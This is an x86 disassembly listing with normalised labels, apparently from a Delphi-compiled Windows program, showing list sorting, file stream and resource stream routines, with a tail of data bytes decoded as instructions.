cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop esi
pop ebx
retn
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax [ ebx + 0x10 ]
lea edx [ eax + esi * 8 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 + 0x8 ]
call sub_4028b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx [ r-xdata ]
call sub_404b30
dec [ ebx + 0x14 ]
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
sub_41517c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4145e4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov edx [ rw-data ]
mov ecx edi
mov eax ebx
call sub_4145e4
cmp edi [ ebx + 0x14 ]
jl r-xdata
test edi edi
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4151d8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4151d8
push ebx
mov ebx [ eax + 0x10 ]
lea edx [ ebx + edx * 8 ]
mov eax [ eax + 0x10 ]
lea eax [ eax + ecx * 8 ]
mov ecx [ edx ]
mov ebx [ eax ]
mov [ edx ] ebx
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov ebx [ eax + 0x4 ]
mov [ edx + 0x4 ] ebx
mov [ eax + 0x4 ] ecx
pop ebx
retn
sub_4151fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov [ esp + 0x8 ] 0x0
xor esi esi
mov eax [ edi + 0x14 ]
dec eax
mov [ esp + 0xc ] eax
cmp esi [ esp + 0xc ]
jg r-xdata
mov eax [ esp + 0x4 ]
mov [ eax ] esi
mov al [ esp + 0x8 ]
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ esp + 0xc ]
add ebx esi
shr ebx 0x1
mov eax [ edi + 0x10 ]
mov edx [ eax + ebx * 8 ]
mov ecx [ esp ]
mov eax edi
mov ebp [ eax ]
call [ ebp + 0x34 ]
test eax eax
jge r-xdata
mov edx ebx
dec edx
mov [ esp + 0xc ] edx
test eax eax
jne r-xdata
lea esi [ ebx + 0x1 ]
jmp r-xdata
cmp esi [ esp + 0xc ]
jle r-xdata
mov [ esp + 0x8 ] 0x1
cmp [ edi + 0x1d ] 0x1
je r-xdata
mov esi ebx
sub_415274
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4145e4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax edi
mov edx [ ebx + 0x10 ]
mov edx [ edx + esi * 8 ]
call sub_404010
pop edi
pop esi
pop ebx
retn
sub_4152b0
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4145e4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax [ ebx + 0x10 ]
mov eax [ eax + esi * 8 + 0x4 ]
pop esi
pop ebx
retn
sub_4152d8
push esi
mov edx [ eax + 0x18 ]
cmp edx 0x40
jle r-xdata
cmp edx 0x8
jle r-xdata
mov esi edx
test esi esi
jns r-xdata
mov esi 0x4
mov esi 0x10
jmp r-xdata
sar esi 0x2
jmp r-xdata
add esi 0x3
add esi edx
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop esi
retn
sub_41530c
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x8c ]
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_4148ac
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_415358
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4145e4
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4145e4
cmp esi [ ebx + 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x88 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_4153ac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x14 ]
cmp eax [ ebx + 0x18 ]
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jge r-xdata
mov eax ebx
call sub_4152d8
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov esi eax
xor eax eax
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax esi
mov edx edi
call sub_404010
inc [ ebx + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 + 0x8 ]
push edx
mov edx [ ebx + 0x10 ]
lea edx [ edx + esi * 8 ]
sub eax esi
mov ecx eax
shl ecx 0x3
mov eax edx
pop edx
call sub_4028b8
sub_415424
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
je r-xdata
test esi esi
jl r-xdata
mov edx [ rw-data ]
xor ecx ecx
mov eax ebx
call sub_4145e4
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4145e4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
lea eax [ eax + esi * 8 ]
mov edx edi
call sub_404010
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_415480
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov edx [ rw-data ]
mov ecx esi
mov eax ebx
call sub_4145e4
cmp esi [ ebx + 0x14 ]
jl r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
mov eax [ ebx + 0x10 ]
mov [ eax + esi * 8 + 0x4 ] edi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop edi
pop esi
pop ebx
retn
sub_4154c0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4151d8
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4154c0
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_415570
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1c ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ esi + 0x1c ] bl
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
sub_4155cc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x1
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
push esi
mov ecx [ ebx + 0x14 ]
dec ecx
xor edx edx
mov eax ebx
call sub_4154c0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
sub_415620
add esp 0xfffffff8
push 0x0
push 0x0
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
mov eax [ esp ]
mov edx [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_415654
push ebx
add esp 0xfffffff0
mov ebx eax
push 0x0
push 0x0
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
push 0x0
push 0x0
mov dl 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ esp ] eax
mov [ esp + 0x4 ] edx
push [ esp + 0xc ]
push [ esp + 0xc ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_4156b8
push ebp
mov ebp esp
mov ecx eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
mov eax ecx
mov ecx [ eax ]
call [ ecx + 0x4 ]
pop ebp
retn 0x8
jmp r-xdata
sub_41570c
push ebp
mov ebp esp
add esp 0xfffffef8
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
call sub_4031bc
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
mov esp ebp
pop ebp
retn
sub_415758
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
mov [ ebp - 0x1a ] cx
mov esi edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ eax ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_4031b4
mov [ ebx ] eax
jmp r-xdata
cmp [ ebx ] 0x0
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
cmp eax [ r-xdata ]
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
push ebp
call sub_41570c
pop ecx
mov eax [ ebx ]
call sub_4031f8
mov [ ebx ] eax
mov eax esi
cdq
push edx
push eax
mov dl [ ebp - 0x1a ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_41570c
pop ecx
sub_4157dc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
jl r-xdata
cmp [ ebp + 0x8 ] 0x80000000
jb r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
cmp [ ebp + 0xc ] 0x0
jne r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov edx eax
xor ecx ecx
mov cl bl
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
jmp r-xdata
sub_41584c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0xc ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
sub_415884
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov ecx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x10 ]
cmp ebx eax
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
sub_4158bc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x8 ] 0xf000
jbe r-xdata
push 0x0
push 0x0
mov eax edi
call sub_415640
mov eax edi
mov edx [ eax ]
call [ edx ]
mov [ ebp + 0x8 ] eax
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x14 ] 0xf000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026bc
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_415998
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x14 ]
cdq
cmp edx [ ebp + 0xc ]
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41599f
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp - 0x14 ]
jmp r-xdata
jmp r-xdata
mov esi [ ebp - 0x18 ]
mov edx esi
mov ecx ebx
mov eax edi
call sub_41584c
mov edx esi
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_415884
mov eax ebx
cdq
sub [ ebp + 0x8 ] eax
sbb [ ebp + 0xc ] edx
sub_4159b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
push 0x1000
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_416034
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_415a00
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_418068
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415a07
mov eax [ ebp - 0x8 ]
call sub_40326c
retn
sub_415a10
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40323c
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_415a6c
push ebp
mov ebp esp
add esp 0xfffffff8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
and edx 0x7f
mov eax [ eax + 0x4 ]
call sub_4082dc
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn 0x8
sub_415aac
push ebp
mov ebp esp
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ ebx + 0x4 ]
push eax
call SetEndOfFile
call sub_40c8c0
pop ebx
pop ebp
retn 0x8
sub_415ad4
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov ax [ ebp + 0x8 ]
push eax
push 0x0
xor edx edx
mov eax esi
call sub_415b18
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_415b18
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_415c41
push [ fs : eax ]
mov [ fs : eax ] esp
cmp di 0xffff
jne r-xdata
add esp 0xfffffff0
call sub_403590
movzx edx di
mov eax esi
call sub_408200
mov ecx eax
xor edx edx
mov eax ebx
call sub_415a10
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
mov edx [ ebp + 0x8 ]
mov eax esi
call sub_40827c
mov ecx eax
xor edx edx
mov eax ebx
call sub_415a10
cmp [ ebx + 0x4 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415c48
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_403fe0
retn
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_40841c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x24 ]
call sub_40ac0c
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40841c
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0xb
call GetLastError
lea edx [ ebp - 0x1c ]
call sub_40ac0c
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
jmp r-xdata
sub_415c48
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_415c6c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
test eax eax
jl r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
call sub_408314
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_415ca8
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0xc ]
test edi edi
jl r-xdata
xor esi esi
test ecx ecx
jl r-xdata
mov esi [ ebx + 0x8 ]
sub esi edi
test esi esi
jle r-xdata
cmp ecx esi
jge r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
mov ecx esi
call sub_4028b8
add [ ebx + 0xc ] esi
jmp r-xdata
mov esi ecx
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_415ce0
sub cx 0x1
jb r-xdata
mov [ eax + 0xc ] edx
jmp r-xdata
je r-xdata
mov eax [ eax + 0xc ]
retn
add [ eax + 0xc ] edx
jmp r-xdata
dec cx
je r-xdata
add edx [ eax + 0x8 ]
mov [ eax + 0xc ] edx
jmp r-xdata
sub_415d04
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_415d30
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_415d48
push ebx
push esi
push edi
mov edi edx
mov esi eax
push 0x0
push 0x0
mov eax edi
call sub_415640
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ebx eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ esi + 0x4 ]
mov ecx ebx
mov eax edi
call sub_41584c
sub_415d80
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov edx eax
mov ecx [ ebx + 0x8 ]
mov eax ebx
call sub_415ca0
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
pop edx
pop ebx
retn
sub_415da8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0xc ]
mov edx esi
mov eax ebx
call sub_415d80
mov [ ebx + 0x8 ] esi
cmp esi edi
jge r-xdata
pop edi
pop esi
pop ebx
retn
mov cx 0x2
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14 ]
sub_415dd4
push ebx
push esi
push edi
cmp [ edx ] 0x0
jle r-xdata
mov esi [ eax + 0x4 ]
mov ecx esi
mov edi [ edx ]
mov ebx [ eax + 0x10 ]
cmp edi ebx
je r-xdata
mov ecx [ edx ]
cmp ecx [ eax + 0x8 ]
je r-xdata
mov eax ecx
pop edi
pop esi
pop ebx
retn
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ edx ]
add ecx 0x1fff
and ecx 0xffffe000
mov [ edx ] ecx
test ebx ebx
jne r-xdata
mov eax esi
call sub_406960
xor ecx ecx
jmp r-xdata
mov ecx [ rw-data ]
movzx ecx [ ecx ]
mov edx [ edx ]
mov eax esi
call sub_406944
mov ecx eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov edx [ edx ]
call sub_406934
mov ecx eax
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
test ecx ecx
jne r-xdata
sub_415e60
push ebx
push esi
push edi
push ebp
mov esi ecx
mov ebp edx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
jl r-xdata
xor eax eax
test esi esi
jl r-xdata
mov edi eax
add edi esi
test edi edi
jle r-xdata
cmp edi [ ebx + 0x8 ]
jle r-xdata
mov edx [ ebx + 0x4 ]
add edx [ ebx + 0xc ]
mov eax ebp
mov ecx esi
call sub_4028b8
mov [ ebx + 0xc ] edi
mov eax esi
jmp r-xdata
cmp edi [ ebx + 0x10 ]
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] edi
mov edx edi
mov eax ebx
call sub_415d80
sub_415eb0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_40323c
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
call sub_40447c
mov ecx eax
mov edx esi
mov eax edi
call sub_415f78
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_415f08
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_415f6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415f72
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
sub_415f78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push esi
call FindResourceA
mov edi eax
mov [ ebx + 0x10 ] edi
test edi edi
jne r-xdata
mov eax [ ebx + 0x10 ]
push eax
push esi
call LoadResource
mov edi eax
mov [ ebx + 0x14 ] edi
test edi edi
jne r-xdata
push ebp
call sub_415f08
pop ecx
mov eax [ ebx + 0x10 ]
push eax
push esi
call SizeofResource
push eax
mov eax [ ebx + 0x14 ]
push eax
call LockResource
mov edx eax
mov eax ebx
pop ecx
call sub_415ca0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
push ebp
call sub_415f08
pop ecx
sub_415fe4
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_406930
mov eax [ esi + 0x14 ]
push eax
call FreeResource
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40325c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_416034
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
mov esi [ ebp + 0x8 ]
mov [ edi + 0x4 ] ecx
mov eax esi
call sub_4026bc
mov [ edi + 0x8 ] eax
mov [ edi + 0xc ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41607c
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
test bl bl
jle r-xdata
mov edx [ esi + 0xc ]
call sub_4026dc
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_4160ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
pushad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dl
popad
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x4bffbff0 ] ah
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
and [ edx + 0x41 ] ah
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x100040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
or dl [ eax + edx * 2 + 0x72 ]
outsd
jo r-xdata
add [ edx + esi ] al
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
xor [ edx + 0x41 ] ah
add [ esi ] cl
push esp
push eax
jb r-xdata
imul edi [ eax + 0x75 ] r-xdata
insb
popad
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x61 ] dh
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x4bffbea0 ] ch
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
fsubp st3
add [ ebx - 0x76 ] eax
adc eax [ edx + edx * 8 - 0x157ffa8c ]
r-xdata
jo r-xdata
inc ebx
cmp [ ebx ] 0x0
je r-xdata
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
outsb
je r-xdata
sub dl 0x2e
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
sub ebp esi
